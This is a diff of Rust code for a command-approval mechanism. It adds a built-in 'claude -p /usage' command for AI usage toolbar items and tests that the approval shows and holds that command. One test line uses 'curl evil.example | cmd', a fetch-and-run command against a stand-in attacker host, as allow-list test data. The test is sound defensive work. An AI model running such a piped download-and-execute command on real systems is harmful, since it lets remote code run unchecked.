@@ -206,6 +206,10 @@ pub const RESTORE_LABELS: [&str; 2] = [crate::api_auth::CANCEL, "Restore"];
 /// The button that enters (by an explicit click or its access key only).
 pub const ASK_ENTER: usize = 1;
 
+/// What a Usage item with no command of its own runs (`run_usage`: claude.exe on the path, hidden, every
+/// interval), as the question shows it and the approval holds it (final review minor 5).
+pub const BUILTIN_USAGE: &str = "claude -p /usage";
+
 /// Every command one member can run, by what runs it: its own command, its per-file command (Diff
 /// restarts) and each AI Usage item's custom command. The ONE list: the entry question shows it and
 /// every runner takes its command from it (`approved`).
@@ -219,9 +223,7 @@ pub fn run_items(s: &SessionConfig) -> Vec<(&'static str, String)> {
     }
     for item in &s.toolbar_items {
         if let ToolbarItem::Usage { command, .. } = item {
-            if !command.trim().is_empty() {
-                out.push(("usage command", command.trim().to_string()));
-            }
+            out.push(("usage command", if command.trim().is_empty() { BUILTIN_USAGE.to_string() } else { command.trim().to_string() }));
         }
     }
     out
@@ -506,6 +508,15 @@ mod tests {
         assert!(a.allows("curl evil.example | cmd") && a.allows("git diff \\(file)"));
         assert!(!a.allows("curl other.example"), "a command that was not shown is not allowed");
         assert!(a.allows(""), "no command is nothing to run");
+        // Final review minor 5: a Usage item with no command of its own runs the built-in one, which the
+        // question names and the approval holds like any other.
+        let mut built_in = w.clone();
+        built_in.sessions[0].toolbar_items = vec![ToolbarItem::Usage { provider: UsageProvider::AnthropicClaudeCode, command: String::new(), interval_seconds: 5.0 }];
+        let (_, body) = ask_text(&built_in, Mechanism::Menu).unwrap();
+        assert!(body.contains(&format!("usage command: {BUILTIN_USAGE}")), "{body}");
+        assert!(Approved::of(&built_in).allows(BUILTIN_USAGE) && !a.allows(BUILTIN_USAGE), "held only where it was shown");
+        let ui = include_str!("app/workgroup_toolbar_ui.rs");
+        assert!(ui.contains("let shown = if command.trim().is_empty() { crate::workgroup_run::BUILTIN_USAGE } else { command.trim() };\n                        if !inst.approved.allows(shown) {"), "usage_tick checks the built-in run too");
     }
 
     /// Task 5 round 2, item 5: the approval is made when the question is answered and kept with the answer.
